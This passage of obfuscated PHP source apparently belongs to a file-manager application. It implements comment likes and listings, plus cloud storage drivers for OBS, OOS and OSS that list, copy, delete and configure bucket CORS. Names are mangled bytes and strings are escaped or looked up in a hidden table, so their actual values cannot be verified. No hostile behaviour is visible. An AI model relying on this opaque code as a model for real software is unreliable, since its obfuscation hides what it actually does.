$this->where(array($ĞÒùÛÀï[1989] => $‚’Ô¿é[$ĞÒùÛÀï[1988]]))->setAdd($ĞÒùÛÀï[1990], -1); } return $this->where($˜¨Ù«ÜÍ)->delete(); } public function edit($ßüÑÉ½, $’Ğ‰—‘¥) { $ú¥·´ƒ’ =& $_SERVER[ü¢ÙÊñÛ]; $®÷ÑÙ’® = array($ú¥·´ƒ’[1989] => $ßüÑÉ½); return $this->where($®÷ÑÙ’®)->save(array($ú¥·´ƒ’[1998] => $’Ğ‰—‘¥)); } public function prasise($Á–£’²ô) { $Ã ¶Şı„ =& $_SERVER[ü¢ÙÊñÛ]; $Èîú³ = Model($Ã ¶Şı„[1999]); $×â Ó‰ä = array($Ã ¶Şı„[1989] => $Á–£’²ô, $Ã ¶Şı„[1750] => USER_ID); $¡ç¥ï¶– = $Èîú³->where($×â Ó‰ä)->find(); if (!$¡ç¥ï¶–) { $Èîú³->add($×â Ó‰ä); $õÏËô„ß = $this->where(array($Ã ¶Şı„[1989] => $Á–£’²ô))->setAdd($Ã ¶Şı„[1991], 1); } else { $Èîú³->where($×â Ó‰ä)->delete(); $õÏËô„ß = $this->where(array($Ã ¶Şı„[1989] => $Á–£’²ô))->setAdd($Ã ¶Şı„[1991], -1); } return $õÏËô„ß; } public function targetInfo($ƒÏ‚Ô‰Ê, $Ä¤ ùÂè) { $‘ÃÕ…¾Ğ =& $_SERVER[ü¢ÙÊñÛ]; $––†û›ó = array($‘ÃÕ…¾Ğ[662] => $ƒÏ‚Ô‰Ê, $‘ÃÕ…¾Ğ[663] => $Ä¤ ùÂè); $¼·ëÂô = $this->where($––†û›ó)->count(); $Ø“ı…Ë = "\122\111\x47\110\124\40\112\117\111\116\40{$this->tablePrefix}\x63\157\x6d\155\x65\156\164\x5f\x70\162\x61\x69\163\x65\x20\x73\x74\x61\x72\x20\x6f\156\x20\x63\157\155\x6d\x65\x6e\x74\x2e\x63\157\155\x6d\145\156\x74\111\x44\x20\75\x20\x73\x74\141\x72\56\143\x6f\155\155\x65\156\164\111\104"; $‰”ÖÑÅ = $this->alias($‘ÃÕ…¾Ğ[441])->where($––†û›ó)->join($Ø“ı…Ë, $‘ÃÕ…¾Ğ[2000])->count(); $Ü»Ö›ı¿ = array($‘ÃÕ…¾Ğ[2001] => $¼·ëÂô, $‘ÃÕ…¾Ğ[2002] => $‰”ÖÑÅ); return $Ü»Ö›ı¿; } public function listData($Á“£¹Ô) { $Ô÷Õèş¶ =& $_SERVER[ü¢ÙÊñÛ]; if (isset($Á“£¹Ô[$Ô÷Õèş¶[2003]])) { if ($Á“£¹Ô[$Ô÷Õèş¶[2003]]) { $Á“£¹Ô[$Ô÷Õèş¶[1996]] = array($Ô÷Õèş¶[1080], intval($Á“£¹Ô[$Ô÷Õèş¶[2003]])); } unset($Á“£¹Ô[$Ô÷Õèş¶[2003]]); } if (isset($Á“£¹Ô[$Ô÷Õèş¶[2004]])) { if ($Á“£¹Ô[$Ô÷Õèş¶[2004]]) { $Á“£¹Ô[$Ô÷Õèş¶[1996]] = array($Ô÷Õèş¶[1077], intval($Á“£¹Ô[$Ô÷Õèş¶[2004]])); } unset($Á“£¹Ô[$Ô÷Õèş¶[2004]]); } return $this->_listData($Á“£¹Ô); } private function _listData($¥§ ³µ¬) { $Ê çî… =& $_SERVER[ü¢ÙÊñÛ]; $§§ÄÀ³ = $this->where($¥§ ³µ¬)->_makeOrder()->selectPage(100); $this->_listAppendParent($§§ÄÀ³[$Ê çî…[457]]); $this->_listAppendUser($§§ÄÀ³[$Ê çî…[457]]); $this->_listAppendMeta($§§ÄÀ³[$Ê çî…[457]]); return $§§ÄÀ³; } private function _makeOrder() { $ºáéÇÊˆ =& $_SERVER[ü¢ÙÊñÛ]; $à¼ƒªÄû = array($ºáéÇÊˆ[1991], $ºáéÇÊˆ[1990], $ºáéÇÊˆ[244]); $Ú»öùŸ¤ = Input::get($ºáéÇÊˆ[541], $ºáéÇÊˆ[17], $ºáéÇÊˆ[508], $à¼ƒªÄû); $ãéÚ¾„¸ = Input::get($ºáéÇÊˆ[542], $ºáéÇÊˆ[17], $ºáéÇÊˆ[1752], array($ºáéÇÊˆ[2005], $ºáéÇÊˆ[537])); $ØôÍèş§ = $Ú»öùŸ¤ . $ºáéÇÊˆ[63] . $ãéÚ¾„¸; return $this->order($ØôÍèş§); } private function _listAppendParent(&$«òî™—Ì) { $Ößí¢¸ =& $_SERVER[ü¢ÙÊñÛ]; $ÏÂö†İ¾ = array_unique(array_to_keyvalue($«òî™—Ì, $Ößí¢¸[22], $Ößí¢¸[1988])); $ÏÂö†İ¾ = array_remove_value($ÏÂö†İ¾, $Ößí¢¸[241]); if (!$ÏÂö†İ¾) { return; } $«Ò¦ä· = $this->where(array($Ößí¢¸[1989] => array($Ößí¢¸[17], $ÏÂö†İ¾)))->select(); $«Ò¦ä· = array_to_keyvalue($«Ò¦ä·, $Ößí¢¸[1996]); foreach ($«òî™—Ì as &$®ŠÑÄ•) { if (isset($«Ò¦ä·[$®ŠÑÄ•[$Ößí¢¸[1988]]])) { $®ŠÑÄ•[$Ößí¢¸[2006]] = $«Ò¦ä·[$®ŠÑÄ•[$Ößí¢¸[1988]]]; } } unset($®ŠÑÄ•); } private function _listAppendUser(&$¡‚ªàÄ) { $¹ƒ¹Ó¼Ú =& $_SERVER[ü¢ÙÊñÛ]; $ò¹ï¸Ÿ˜ = array_unique(array_to_keyvalue($¡‚ªàÄ, $¹ƒ¹Ó¼Ú[22], $¹ƒ¹Ó¼Ú[1759])); $ò¹ï¸Ÿ˜ = array_remove_value($ò¹ï¸Ÿ˜, $¹ƒ¹Ó¼Ú[241]); if (count($ò¹ï¸Ÿ˜) == 0) { return; } foreach ($¡‚ªàÄ as $ëüĞåˆÑ) { if (isset($ëüĞåˆÑ[$¹ƒ¹Ó¼Ú[2006]])) { $ò¹ï¸Ÿ˜[] = $ëüĞåˆÑ[$¹ƒ¹Ó¼Ú[2006]][$¹ƒ¹Ó¼Ú[1759]]; } } $˜÷ùı­£ = Model($¹ƒ¹Ó¼Ú[608])->userListInfo($ò¹ï¸Ÿ˜); foreach ($¡‚ªàÄ as &$ëüĞåˆÑ) { $ëüĞåˆÑ[$¹ƒ¹Ó¼Ú[676]] = $˜÷ùı­£[$ëüĞåˆÑ[$¹ƒ¹Ó¼Ú[1759]]]; if (isset($ëüĞåˆÑ[$¹ƒ¹Ó¼Ú[2006]])) { $ëüĞåˆÑ[$¹ƒ¹Ó¼Ú[2006]][$¹ƒ¹Ó¼Ú[676]] = $˜÷ùı­£[$ëüĞåˆÑ[$¹ƒ¹Ó¼Ú[2006]][$¹ƒ¹Ó¼Ú[1759]]]; } } unset($ëüĞåˆÑ); } private function _listAppendMeta(&$»Ú—Œ¢) { $àºŸ¥ï =& $_SERVER[ü¢ÙÊñÛ]; $ì¨ÔãõÂ = array_unique(array_to_keyvalue($»Ú—Œ¢, $àºŸ¥ï[22], $àºŸ¥ï[1996])); $ì¨ÔãõÂ = array_remove_value($ì¨ÔãõÂ, $àºŸ¥ï[241]); if (!$ì¨ÔãõÂ) { return; } foreach ($»Ú—Œ¢ as $ëªı–‡) { if (isset($ëªı–‡[$àºŸ¥ï[2006]])) { $ì¨ÔãõÂ[] = $ëªı–‡[$àºŸ¥ï[2006]][$àºŸ¥ï[1996]]; } } $¢æÄÃ¸ = $this->metaList($ì¨ÔãõÂ); if (!$¢æÄÃ¸) { return !1; } foreach ($»Ú—Œ¢ as &$ëªı–‡) { $ëªı–‡[$àºŸ¥ï[550]] = $¢æÄÃ¸[$ëªı–‡[$àºŸ¥ï[1996]]]; if (isset($ëªı–‡[$àºŸ¥ï[2006]])) { $ëªı–‡[$àºŸ¥ï[2006]][$àºŸ¥ï[550]] = $¢æÄÃ¸[$ëªı–‡[$àºŸ¥ï[2006]][$àºŸ¥ï[1996]]]; } } unset($ëªı–‡); } private function metaList($¤®Ÿ¸Ê÷) { $¸òô‚²À =& $_SERVER[ü¢ÙÊñÛ]; if (!$¤®Ÿ¸Ê÷) { return array(); } $¥µ×À‚š = array($¸òô‚²À[1996] => array($¸òô‚²À[17], $¤®Ÿ¸Ê÷)); $¾²Îş§ = Model($¸òô‚²À[2007])->where($¥µ×À‚š)->select(); $¾²Îş§ = array_to_keyvalue_group($¾²Îş§, $¸òô‚²À[1996]); foreach ($¾²Îş§ as $ŠáÄ–‡ğ => $È‚Ë’«) { $ïÚıÙ´ = array(); foreach ($È‚Ë’« as $ùœ öĞÔ) { $ïÚıÙ´[$ùœ öĞÔ[$¸òô‚²À[108]]] = $ùœ öĞÔ[$¸òô‚²À[462]]; } $¾²Îş§[$ŠáÄ–‡ğ] = $ïÚıÙ´; } return $¾²Îş§ ? $¾²Îş§ : array(); } public function removeTarget($œ¥çıïÁ, $½¥ÍÛ¢) { $­î‹Ä º =& $_SERVER[ü¢ÙÊñÛ]; if (!$½¥ÍÛ¢) { return !0; } $½¥ÍÛ¢ = is_array($½¥ÍÛ¢) ? $½¥ÍÛ¢ : array($½¥ÍÛ¢); $€­Ì»ˆ¥ = array($­î‹Ä º[201] => $œ¥çıïÁ, $­î‹Ä º[580] => array($­î‹Ä º[17], $½¥ÍÛ¢)); $®Ú¶’â = $this->field($­î‹Ä º[1996])->where($€­Ì»ˆ¥)->select(); $¤ êüú = array_to_keyvalue($®Ú¶’â, $­î‹Ä º[22], $­î‹Ä º[1996]); if (!$¤ êüú) { return !0; } $€­Ì»ˆ¥ = array($­î‹Ä º[1996] => array($­î‹Ä º[17], $¤ êüú)); $this->where($€­Ì»ˆ¥)->delete(); Model($­î‹Ä º[1999])->where($€­Ì»ˆ¥)->delete(); Model($­î‹Ä º[2008])->where($€­Ì»ˆ¥)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\146\x69\x6c\145\137\143\157\156\164\x65\x6e\x74\163"; protected $dataAuto = array(array("\143\x72\145\141\x74\x65\x54\x69\155\145", "\164\151\x6d\145", "\x69\x6e\x73\145\162\x74", "\146\x75\156\143\164\x69\x6f\x6e")); } goto Cåƒˆ ÂŸÆ; cËÙÈÕ¶ïõ: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ÃßüèÇ›) { parent::__construct($ÃßüèÇ›); $this->setSignVersion($_SERVER[ü¢ÙÊñÛ][260]); } public function fileOutImage($Ô¶ãÏ¤€, $òµ£¤Š‹ = 250) { $äÎƒæı‚ =& $_SERVER[ü¢ÙÊñÛ]; if ($this->size($Ô¶ãÏ¤€) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ô¶ãÏ¤€, $òµ£¤Š‹); } $Ó¸ĞüÙµ = array($äÎƒæı‚[1449] => $äÎƒæı‚[1450] . $òµ£¤Š‹ . $äÎƒæı‚[1451]); $ò°à’Ò = $this->link($Ô¶ãÏ¤€, $Ó¸ĞüÙµ); $this->fileOutLink($ò°à’Ò); } public function fileOutLink($Ç°Û²Ÿ) { $ó¤é†¦© =& $_SERVER[ü¢ÙÊñÛ]; if (substr($Ç°Û²Ÿ, 0, 7) == $ó¤é†¦©[229]) { $Ç°Û²Ÿ = $ó¤é†¦©[230] . substr($Ç°Û²Ÿ, 7); } header($ó¤é†¦©[186] . $Ç°Û²Ÿ); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($¢İ’Æİ) { parent::__construct($¢İ’Æİ); $this->setSignVersion($_SERVER[ü¢ÙÊñÛ][260]); } public function fileOutLink($ü€·Îüü) { $°ÒÀµ˜Ú =& $_SERVER[ü¢ÙÊñÛ]; if (substr($ü€·Îüü, 0, 7) == $°ÒÀµ˜Ú[229]) { $ü€·Îüü = $°ÒÀµ˜Ú[230] . substr($ü€·Îüü, 7); } header($°ÒÀµ˜Ú[186] . $ü€·Îüü); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($Ï‘•ñö) { parent::__construct(); include_once SDK_DIR . $_SERVER[ü¢ÙÊñÛ][1452]; $this->_init($Ï‘•ñö); } public function _init($ˆ„ìÁ²š) { $’Ú¶®¦¡ =& $_SERVER[ü¢ÙÊñÛ]; $this->config = $ˆ„ìÁ²š; foreach ($ˆ„ìÁ²š as $ŒØ÷ûì› => $äÀŠÏ¥§) { if (isset($this->{$ŒØ÷ûì›})) { $this->{$ŒØ÷ûì›} = $äÀŠÏ¥§; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($’Ú¶®¦¡[1453] . LNG($’Ú¶®¦¡[1454])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $²ò´Ó“û =& $_SERVER[ü¢ÙÊñÛ]; $ ²ŠñÛ = new OSS\Model\CorsConfig(); $ıÂœÔ = new OSS\Model\CorsRule(); $ıÂœÔ->addAllowedOrigin($²ò´Ó“û[1455]); $ıÂœÔ->addAllowedMethod($²ò´Ó“û[1456]); $ıÂœÔ->addAllowedMethod($²ò´Ó“û[1457]); $ıÂœÔ->addAllowedMethod($²ò´Ó“û[1458]); $ıÂœÔ->addAllowedMethod($²ò´Ó“û[1459]); $ıÂœÔ->addAllowedMethod($²ò´Ó“û[176]); $ıÂœÔ->setMaxAgeSeconds(600); $ıÂœÔ->addExposeHeader($²ò´Ó“û[1460]); $ıÂœÔ->addAllowedHeader($²ò´Ó“û[1455]); $ ²ŠñÛ->addRule($ıÂœÔ); try { $this->client->putBucketCors($this->bucket, $ ²ŠñÛ); } catch (OSS\Core\OssException $œäŠ‡ü„) { $this->writeLog(__FUNCTION__ . $²ò´Ó“û[225] . $œäŠ‡ü„->getMessage()); return !1; } return !0; } public function getBucketCors() { $´Šó±î™ =& $_SERVER[ü¢ÙÊñÛ]; $”ŞÒÀó÷ = null; try { $”ŞÒÀó÷ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $«„¾–œ¥) { $this->writeLog(__FUNCTION__ . $´Šó±î™[225] . $«„¾–œ¥->getMessage()); return null; } if (!$”ŞÒÀó÷ || !($¥à“¨éº = $”ŞÒÀó÷->getRules())) { return null; } $¢‘ÃÕ§¹ = $¥à“¨éº[0]->getAllowedOrigins(); $èÄáòß‡ = $¥à“¨éº[0]->getAllowedMethods(); $’°›µ•» = $¥à“¨éº[0]->getMaxAgeSeconds(); $İÍ³ Áü = $¥à“¨éº[0]->getExposeHeaders(); $êê®©˜Ú = $¥à“¨éº[0]->getAllowedHeaders(); return array($´Šó±î™[231] => isset($¢‘ÃÕ§¹[0]) ? $¢‘ÃÕ§¹[0] : $´Šó±î™[22], $´Šó±î™[235] => $èÄáòß‡, $´Šó±î™[1461] => $’°›µ•», $´Šó±î™[1462] => isset($İÍ³ Áü[0]) ? $İÍ³ Áü[0] : $´Šó±î™[22], $´Šó±î™[232] => isset($êê®©˜Ú[0]) ? $êê®©˜Ú[0] : $´Šó±î™[22]); } public function isBucketCors() { $øŞĞ®‘½ =& $_SERVER[ü¢ÙÊñÛ]; $Ğ÷‘ÌØº = $this->getBucketCors(); if (!$Ğ÷‘ÌØº || !is_array($Ğ÷‘ÌØº)) { return !1; } if ($Ğ÷‘ÌØº[$øŞĞ®‘½[231]] != $øŞĞ®‘½[233] || $Ğ÷‘ÌØº[$øŞĞ®‘½[232]] != $øŞĞ®‘½[233]) { return !1; } $éÇá“ª  = array_map($øŞĞ®‘½[234], $Ğ÷‘ÌØº[$øŞĞ®‘½[235]]); if (!is_array($éÇá“ª )) { $éÇá“ª  = array(); } $¬ŞÁ · = array($øŞĞ®‘½[236], $øŞĞ®‘½[237], $øŞĞ®‘½[238], $øŞĞ®‘½[239], $øŞĞ®‘½[240]); $«˜óú¤µ = array_diff($¬ŞÁ ·, $éÇá“ª ); return empty($«˜óú¤µ); } public function mkfile($¬ëÇä™³, $†§Ëª¢¤ = '', $Íã‡Åœ = REPEAT_RENAME) { $ù«ÄÖãŸ = $this->setContent($¬ëÇä™³, $†§Ëª¢¤); if ($ù«ÄÖãŸ !== !1) { return $this->getPathOuter($¬ëÇä™³); } return !1; } public function mkdir($È¹ª¶Ñ•, $˜ÊäØÄ = REPEAT_SKIP) { if ($˜ÊäØÄ && $this->_isFolder($È¹ª¶Ñ•)) { return $this->getPathOuter($È¹ª¶Ñ•); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($È¹ª¶Ñ•)); } catch (OSS\Core\OssException $’¤€ıãª) { $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][225] . $’¤€ıãª->getMessage()); return !1; } return $this->getPathOuter($È¹ª¶Ñ•); } private function fileList($í×îËñ, $Êš‘Üší = '', $ËªÄäÊé = 0) { $È±¯Åµã =& $_SERVER[ü¢ÙÊñÛ]; $í×îËñ = trim($í×îËñ, $È±¯Åµã[18]); $‰®Î§€³ = empty($í×îËñ) && $í×îËñ !== $È±¯Åµã[241] ? $È±¯Åµã[22] : $í×îËñ . $È±¯Åµã[18]; $Öú—Ø“­ = $È±¯Åµã[22]; $İË®Àï = 1000; $²÷ä†à = $ºŞàÄáÓ = array(); while (!0) { check_abort(); $ìÇ«­–´ = array($È±¯Åµã[1463] => $Êš‘Üší, $È±¯Åµã[1464] => $‰®Î§€³, $È±¯Åµã[1465] => $İË®Àï, $È±¯Åµã[1466] => $Öú—Ø“­); try { $»ÁÑ©ƒ¯ = $this->client->listObjects($this->bucket, $ìÇ«­–´); } catch (OSS\Core\OssException $Œ×ïóñÖ) { $this->writeLog(__FUNCTION__ . $È±¯Åµã[225] . $Œ×ïóñÖ->getMessage()); break; } $Öú—Ø“­ = $»ÁÑ©ƒ¯->getNextMarker(); $öñËàÀĞ = $»ÁÑ©ƒ¯->getObjectList(); $Öˆ»ıƒã = $»ÁÑ©ƒ¯->getPrefixList(); foreach ($öñËàÀĞ as $¨»ùªÚé) { if ($¨»ùªÚé->getKey() == $‰®Î§€³) { continue; } $çúöøÅÍ = $¨»ùªÚé->getKey(); $Ô¬¨·¡Î = $¨»ùªÚé->getSize(); $º¨ç§ç¹ = $¨»ùªÚé->getLastModified(); $Ëõä ĞÕ = trim($¨»ùªÚé->getETag(), $È±¯Åµã[132]); $Ê¹úØÆñ = $ËªÄäÊé ? array($È±¯Åµã[42] => $çúöøÅÍ, $È±¯Åµã[90] => $Ô¬¨·¡Î, $È±¯Åµã[217] => strtotime($º¨ç§ç¹), $È±¯Åµã[1467] => $Ëõä ĞÕ) : $çúöøÅÍ; $éÓœçù = $Ô¬¨·¡Î == 0 && substr($çúöøÅÍ, strlen($çúöøÅÍ) - 1, 1) == $È±¯Åµã[18] ? !0 : !1; $ÈŒ°÷ôï = array($È±¯Åµã[90] => $Ô¬¨·¡Î, $È±¯Åµã[1468] => $Ô¬¨·¡Î, $È±¯Åµã[99] => strtotime($º¨ç§ç¹), $È±¯Åµã[1469] => $º¨ç§ç¹, $È±¯Åµã[1467] => $Ëõä ĞÕ); $this->cacheMethodInfoSet($çúöøÅÍ, $éÓœçù, $ÈŒ°÷ôï); if ($éÓœçù) { $²÷ä†à[] = $çúöøÅÍ; continue; } $ºŞàÄáÓ[] = $Ê¹úØÆñ; } foreach ($Öˆ»ıƒã as $ÜÜíæ¨…) { $²÷ä†à[] = $ÜÜíæ¨…->getPrefix(); $this->cacheMethodInfoSet($ÜÜíæ¨…->getPrefix(), !0); } if ($Öú—Ø“­ === $È±¯Åµã[22]) { break; } } $this->cacheMethodInfoSet($í×îËñ, !0); return array($È±¯Åµã[96] => $²÷ä†à, $È±¯Åµã[97] => $ºŞàÄáÓ); } public function listObject($©Ùî—Şª, $““à£ü¹ = '') { $‹åÜø =& $_SERVER[ü¢ÙÊñÛ]; $©Ùî—Şª = trim($©Ùî—Şª, $‹åÜø[18]); $©˜¿À† = empty($©Ùî—Şª) && $©Ùî—Şª !== $‹åÜø[241] ? $‹åÜø[22] : $©Ùî—Şª . $‹åÜø[18]; $¿¤ñôÃ“ = $‹åÜø[22]; $ØÔšŞµô = 1000; $“¹¡Ç¼ó = $›Æ÷¢¯ = array(); while (!0) { check_abort(); $Ôİš‹á = array($‹åÜø[1463] => $““à£ü¹, $‹åÜø[1464] => $©˜¿À†, $‹åÜø[1465] => $ØÔšŞµô, $‹åÜø[1466] => $¿¤ñôÃ“); try { $°á¢—‚é = $this->client->listObjects($this->bucket, $Ôİš‹á); } catch (OSS\Core\OssException $Îë”ãû) { $this->writeLog(__FUNCTION__ . $‹åÜø[225] . $Îë”ãû->getMessage()); break; } $¿¤ñôÃ“ = $°á¢—‚é->getNextMarker(); $ñÊñÅÛ = $°á¢—‚é->getObjectList(); foreach ($ñÊñÅÛ as $„¿«º£†) { if ($„¿«º£†->getKey() == $©˜¿À†) { continue; } $”¥ŸÏ ® = $„¿«º£†->getKey(); $ùö¦ÌÒü = $„¿«º£†->getSize(); $”èĞïâ² = $ùö¦ÌÒü == 0 && substr($”¥ŸÏ ®, strlen($”¥ŸÏ ®) - 1, 1) == $‹åÜø[18] ? !0 : !1; if ($”èĞïâ²) { continue; } $›Æ÷¢¯[] = $ùö¦ÌÒü . $‹åÜø[225] . $”¥ŸÏ ®; } if ($¿¤ñôÃ“ === $‹åÜø[22]) { break; } } return array($‹åÜø[96] => $“¹¡Ç¼ó, $‹åÜø[97] => $›Æ÷¢¯); } public function copyFile($ãöÚîÒÉ, $ûğçËŸ) { $‰º¶œèÂ = $this->size($ãöÚîÒÉ); if ($‰º¶œèÂ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ãöÚîÒÉ, $this->bucket, $this->pathEncode($ûğçËŸ)); } catch (OSS\Core\OssException $²„ ¸»±) { $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][225] . $²„ ¸»±->getMessage()); return !1; } return $this->getPathOuter($ûğçËŸ); } $á†š—Ş = $this->multiCopyObject($ãöÚîÒÉ, $ûğçËŸ, $‰º¶œèÂ); return $á†š—Ş ? $this->getPathOuter($ûğçËŸ) : !1; } private function multiCopyObject($Ãí‰Æ¹, $è¯à¯•, $’£¼¼£) { $¦‰¿şğ =& $_SERVER[ü¢ÙÊñÛ]; try { $È™å°ÂŸ = array(); if ($ÙêÀ§ = $this->hashMd5($Ãí‰Æ¹)) { $È™å°ÂŸ = array(OSS\OssClient::OSS_HEADERS => array($¦‰¿şğ[1470] => $ÙêÀ§)); } $åİ¶€³® = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($è¯à¯•), $È™å°ÂŸ); $ĞÒÇ¥ê­ = 1; $ìî¸ïíÕ = 0; $ş·Ş—Ğ’ = array(); $ÀÓåÂÙ® = 1024 * 1024 * 10; $¤—î·¬³ = $this->client->generateMultiuploadParts($’£¼¼£, $ÀÓåÂÙ®); foreach ($¤—î·¬³ as $øü† => $¾£ãïÔ) { $¡Ÿ¦üãŞ = $ìî¸ïíÕ + (int) $¾£ãïÔ[$¦‰¿şğ[1471]]; $®©öç·Ö = (int) $¾£ãïÔ[$¦‰¿şğ[424]] + $¡Ÿ¦üãŞ - 1; $–â‰ôˆÑ = array($¦‰¿şğ[178] => $¡Ÿ¦üãŞ, $¦‰¿şğ[179] => $®©öç·Ö); $ş·Ş—Ğ’[] = $this->client->uploadPartCopy($this->bucket, $Ãí‰Æ¹, $this->bucket, $this->pathEncode($è¯à¯•), $ĞÒÇ¥ê­, $åİ¶€³®, $–â‰ôˆÑ); $ĞÒÇ¥ê­ = $ĞÒÇ¥ê­ + 1; } $§¶ÔÄ·° = array(); foreach ($ş·Ş—Ğ’ as $øü† => $’µÎƒÜğ) { $§¶ÔÄ·°[] = array($¦‰¿şğ[309] => $øü† + 1, $¦‰¿şğ[310] => $’µÎƒÜğ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($è¯à¯•), $åİ¶€³®, $§¶ÔÄ·°); } catch (OSS\Core\OssException $†ø—Ê…ù) { $this->writeLog(__FUNCTION__ . $¦‰¿şğ[225] . $†ø—Ê…ù->getMessage()); return !1; } return !0; } public function moveFile($ê›Æã’, $˜ú—§¯ú) { if ($this->copyFile($ê›Æã’, $˜ú—§¯ú)) { $this->remove($ê›Æã’); return $this->getPathOuter($˜ú—§¯ú); } return !1; } public function delFile($ÊÏ§Âáä) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ÊÏ§Âáä)); } catch (OSS\Core\OssException $µ‹äª¶±) { $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][225] . $µ‹äª¶±->getMessage()); return !1; } return !0; } public function delFolder($¾Ïˆ°šõ) { $ÃŸÃÁ‹¡ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->exist($¾Ïˆ°šõ)) { return !0; } $this->listItemCache = !1; $âõ«ú¼ = $this->fileList($¾Ïˆ°šõ); $this->listItemCache = !0; $‹´­ËòÏ = trim($¾Ïˆ°šõ, $ÃŸÃÁ‹¡[18]) . $ÃŸÃÁ‹¡[18]; if (!empty($¾Ïˆ°šõ) && $¾Ïˆ°šõ !== $ÃŸÃÁ‹¡[241] && !in_array($‹´­ËòÏ, $âõ«ú¼[$ÃŸÃÁ‹¡[96]])) { $âõ«ú¼[$ÃŸÃÁ‹¡[96]][] = $‹´­ËòÏ; } $³ş³üò = $this->delByBatch($âõ«ú¼[$ÃŸÃÁ‹¡[97]]); if (!$³ş³üò) { return !1; } $³ş³üò = $this->delByBatch($âõ«ú¼[$ÃŸÃÁ‹¡[96]]); if (!$³ş³üò) { return !1; } return $this->delFile($‹´­ËòÏ); } private function delByBatch($¾´êå‡Ì) { foreach (array_chunk($¾´êå‡Ì, 1000) as $±äÁ‰¦ô) { try { $this->client->deleteObjects($this->bucket, $±äÁ‰¦ô); } catch (OSS\Core\OssException $µö—ıÅÚ) { $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][225] . $µö—ıÅÚ->getMessage()); return !1; } } return !0; } public function rename($¶Â¥˜Ä, $£ù·¡è) { return $this->renameObject($¶Â¥˜Ä, $£ù·¡è); } private function fileInfo($ù”´¶Ç³, $ÕÀşˆ¤ù = false, $âòªùŸ­ = array()) { $§ó‚ÙÊŸ =& $_SERVER[ü¢ÙÊñÛ]; $ê¢ß£¼Ò = array($§ó‚ÙÊŸ[42] => $this->pathThis($ù”´¶Ç³), $§ó‚ÙÊŸ[98] => $this->getPathOuter($ù”´¶Ç³), $§ó‚ÙÊŸ[43] => $§ó‚ÙÊŸ[243], $§ó‚ÙÊŸ[90] => isset($âòªùŸ­[$§ó‚ÙÊŸ[90]]) ? $âòªùŸ­[$§ó‚ÙÊŸ[90]] : 0, $§ó‚ÙÊŸ[180] => $this->ext($ù”´¶Ç³)); if ($ÕÀşˆ¤ù) { return $ê¢ß£¼Ò; } $ê¢ß£¼Ò[$§ó‚ÙÊŸ[244]] = $ê¢ß£¼Ò[$§ó‚ÙÊŸ[99]] = 0; $ê¢ß£¼Ò[$§ó‚ÙÊŸ[245]] = $ê¢ß£¼Ò[$§ó‚ÙÊŸ[246]] = !0; if (empty($âòªùŸ­)) { $¯úÕÎú = $this->objectMeta($ù”´¶Ç³); if (!$¯úÕÎú) { return $ê¢ß£¼Ò; } $âòªùŸ­ = array($§ó‚ÙÊŸ[99] => strtotime($¯úÕÎú[$§ó‚ÙÊŸ[1469]]), $§ó‚ÙÊŸ[90] => $¯úÕÎú[$§ó‚ÙÊŸ[1468]] + 0, $§ó‚ÙÊŸ[1467] => $¯úÕÎú[$§ó‚ÙÊŸ[1467]]); } if (isset($âòªùŸ­[$§ó‚ÙÊŸ[1467]]) && $âòªùŸ­[$§ó‚ÙÊŸ[1467]]) { $ê¢ß£¼Ò[$§ó‚ÙÊŸ[248]] = trim($âòªùŸ­[$§ó‚ÙÊŸ[1467]], $§ó‚ÙÊŸ[132]); } if (isset($âòªùŸ­[$§ó‚ÙÊŸ[90]])) { $ê¢ß£¼Ò[$§ó‚ÙÊŸ[90]] = $âòªùŸ­[$§ó‚ÙÊŸ[90]]; } if (isset($âòªùŸ­[$§ó‚ÙÊŸ[99]])) { $ê¢ß£¼Ò[$§ó‚ÙÊŸ[99]] = $âòªùŸ­[$§ó‚ÙÊŸ[99]]; } if (isset($âòªùŸ­[$§ó‚ÙÊŸ[217]]) && !trim($ê¢ß£¼Ò[$§ó‚ÙÊŸ[99]])) { $ê¢ß£¼Ò[$§ó‚ÙÊŸ[99]] = $âòªùŸ­[$§ó‚ÙÊŸ[217]]; } return $ê¢ß£¼Ò; } private function folderInfo($Èİø‡, $¼®³û·– = false, $ÈŒõÙ = array()) { $®¨Œ±Ë =& $_SERVER[ü¢ÙÊñÛ]; $‘ÉÙøêó = array($®¨Œ±Ë[42] => $this->pathThis($Èİø‡), $®¨Œ±Ë[98] => $this->getPathOuter($®¨Œ±Ë[18] . $Èİø‡), $®¨Œ±Ë[43] => $®¨Œ±Ë[89]); if ($¼®³û·–) { return $‘ÉÙøêó; } $‘ÉÙøêó[$®¨Œ±Ë[244]] = $‘ÉÙøêó[$®¨Œ±Ë[99]] = 0; $‘ÉÙøêó[$®¨Œ±Ë[245]] = $‘ÉÙøêó[$®¨Œ±Ë[246]] = !0; if (empty($ÈŒõÙ)) { $Èİø‡ = rtrim($Èİø‡, $®¨Œ±Ë[18]) . $®¨Œ±Ë[18]; $îñêÏÂ¶ = $this->objectMeta($Èİø‡); if (!$îñêÏÂ¶) { return $‘ÉÙøêó; } $ÈŒõÙ = array($®¨Œ±Ë[244] => $îñêÏÂ¶[$®¨Œ±Ë[586]][$®¨Œ±Ë[1472]], $®¨Œ±Ë[99] => 